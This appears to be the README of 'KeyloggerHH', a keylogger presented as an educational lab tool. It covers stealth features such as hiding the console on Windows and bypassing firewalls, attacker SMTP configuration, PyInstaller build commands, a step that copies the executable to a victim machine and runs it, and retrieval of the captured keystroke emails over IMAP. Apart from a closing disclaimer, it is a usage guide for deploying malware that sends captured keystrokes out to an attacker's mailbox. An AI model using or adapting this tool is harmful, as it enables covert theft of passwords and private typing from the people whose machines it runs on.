# KeyloggerHH - SMTP Keystroke Exfiltration Tool

Educational cybersecurity lab tool for keystroke capture via SMTP email.

## Features

✅ Cross-platform (Linux & Windows)  
✅ SMTP email exfiltration (bypasses firewall restrictions)  
✅ Multithreaded architecture (non-blocking keystroke capture)  
✅ Smart buffering (sends every 100 keys OR 60 seconds)  
✅ Self-hosted SMTP support (Postfix, Sendmail, etc.)  
✅ Stealth execution on Windows (no console)  
✅ Standalone executable (no Python required on victim)

## Network Topology

```
LAN (Victim) → DMZ (SMTP Server) → WAN (Attacker)
Ubuntu Victim → SMTP Server (172.16.0.x) → Attacker's Mailbox
```

## Configuration

Edit `src/main.py` before building:

```python
SMTP_SERVER = "172.16.0.5"  # Your DMZ SMTP server IP
SMTP_PORT = 587
SENDER_EMAIL = "attacker@dmz.local"
SENDER_PASSWORD = "your-password"
RECEIVER_EMAIL = "attacker@dmz.local"  # Same account
```

## Build Instructions

### Linux
```bash
pip install pynput pyinstaller
pyinstaller --onefile --clean --paths=src src/main.py
```
Output: `dist/main`

### Windows
```powershell
pip install pynput pyinstaller
pyinstaller --onefile --noconsole --clean --paths=src src/main.py
```
Output: `dist/main.exe`

## Lab Simulation

### Prerequisites
- DMZ SMTP server with user account created
- Firewall rules: LAN → DMZ (port 587)

### Step 1: Setup SMTP Server (DMZ)
Create email account: `attacker@dmz.local`

### Step 2: Build Keylogger
- Edit configuration in `src/main.py`
- Build executable

### Step 3: Deploy to Victim
```bash
scp dist/main user@victim:/tmp/
./main
```

### Step 4: Retrieve Logs (Attacker)
- Use Thunderbird/email client
- Connect via IMAP to DMZ server
- Download keystroke emails

## How It Works

- Queue collects keystrokes (non-blocking)
- Buffer aggregates keystrokes
- Sender thread emails periodically
- Thread-safe operations

## Email Format

- Subject: `Keylog - YYYY-MM-DD HH:MM:SS`
- Body: Plain text keystrokes
- Sent from and to same account

## Disclaimer

⚠️ **For authorized educational cybersecurity lab use only.** Do NOT use on real systems without permission.
